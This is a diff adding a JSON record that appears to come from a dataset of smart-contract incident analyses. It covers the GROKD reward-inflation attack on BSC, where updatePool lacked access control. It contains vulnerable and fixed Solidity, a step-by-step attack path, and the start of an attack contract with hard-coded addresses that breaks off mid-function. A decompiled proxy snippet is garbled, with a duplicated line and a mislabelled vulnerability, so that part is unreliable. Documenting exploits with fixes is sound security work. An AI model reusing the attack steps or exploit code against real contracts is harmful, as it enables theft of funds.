@@ -1,0 +1,36 @@
+{
+ "id": "2024__2024-04-XX_GROKD_UpdatePoolAccessControl",
+ "source_file": "2024/2024-04-XX_GROKD_UpdatePoolAccessControl.md",
+ "title": "GROKD — Reward Inflation via Missing Access Control on updatePool Analysis",
+ "date": "2024-04-01",
+ "protocol": "GROKD",
+ "chain": "BSC",
+ "loss_raw": "~150 BNB",
+ "loss_usd": null,
+ "root_cause": "No access control on `updatePool(uint256, PoolInfo calldata)`, allowing `rewardPerBlock` to be set to 48 million ether; attacker deposited LP tokens then called `update()` + `reward()` to claim inflated GROKD rewards",
+ "attack_tx": null,
+ "vulnerable_contract": "Deposit 0x31d3231c",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no access control on updatePool\nstruct PoolInfo {\n    uint256 rewardPerBlock;\n    uint256 startBlock;\n    uint256 endBlock;\n    // ...\n}\n\nfunction updatePool(uint256 poolId, PoolInfo calldata poolInfo) external {\n    // No onlyOwner — anyone can modify pool parameters\n    pools[poolId] = poolInfo;\n}\n\nfunction update() external {\n    // Reward calculated based on rewardPerBlock * (currentBlock - lastBlock)\n    uint256 reward = pools[0].rewardPerBlock * blockDiff;\n    pendingRewards[msg.sender] += reward;\n}\n\n//",
+  "// File: GROKD_decompiled.sol\ncontract GROKD_Proxy {\ncontract GROKD_Proxy {\n    // EIP-1967 implementation slot\n    bytes32 internal constant _IMPLEMENTATION_SLOT =\n        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    fallback() external payable {  // ❌ Vulnerability\n        // Delegates call to implementation via delegatecall\n    }\n}"
+ ],
+ "code_after": [
+  "✅ Safe code: only owner can call updatePool\nfunction updatePool(uint256 poolId, PoolInfo calldata poolInfo) external onlyOwner {\n    require(poolInfo.rewardPerBlock <= MAX_REWARD_PER_BLOCK, \"reward too high\");\n    pools[poolId] = poolInfo;\n    emit PoolUpdated(poolId, poolInfo);\n}"
+ ],
+ "steps": [
+  "→ [1] Acquire LP tokens via Uniswap",
+  "→ [2] depositFromIDO(attacker, lpAmount)",
+  "→ [3] updatePool(0, {rewardPerBlock: 48_000_000e18, ...})",
+  "→ [4] update() — accumulate rewards based on elapsed blocks",
+  "→ [5] reward() — withdraw accumulated GROKD rewards",
+  "→ [6] Swap GROKD → BNB",
+  "→ [7] ~150 BNB profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Acquire LP tokens via Uniswap\n  │\n  ├─→ [2] depositFromIDO(attacker, lpAmount)\n  │         └─ Deposit LP tokens\n  │\n  ├─→ [3] updatePool(0, {rewardPerBlock: 48_000_000e18, ...})\n  │         └─ No access control — reward rate set to extreme value\n  │\n  ├─→ [4] update() — accumulate rewards based on elapsed blocks\n  │         └─ rewardPerBlock 48M * blockDiff = astronomical reward\n  │\n  ├─→ [5] reward() — withdraw accumulated GROKD rewards\n  │\n  ├─→ [6] Swap GROKD → BNB\n  │\n  └─→ [7] ~150 BNB profit",
+  "interface IGROKDDeposit {\n    struct PoolInfo {\n        uint256 rewardPerBlock;\n        uint256 startBlock;\n        uint256 endBlock;\n    }\n\n    function updatePool(uint256 poolId, PoolInfo calldata poolInfo) external;\n    function depositFromIDO(address user, uint256 amount) external;\n    function update() external;\n    function reward() external;\n}\n\ncontract AttackContract {\n    IGROKDDeposit constant deposit = IGROKDDeposit(0x31d3231cDa62C0b7989b488cA747245676a32D81);\n    IERC20        constant GROKD   = IERC20(0xa4133feD73Ea3361f2f928f98313b1e1e5049612);\n    IERC20        constant lpToken = IERC20(0x8AF65d9114DfcCd050e7352D77eeC98f40c42CFD);\n\n    function testExploit() external {\n        // [1] Acquire LP tokens and deposit\n        uint256 lpBal = lpToken.balanceOf(address(this));\n    "
+ ]
+}
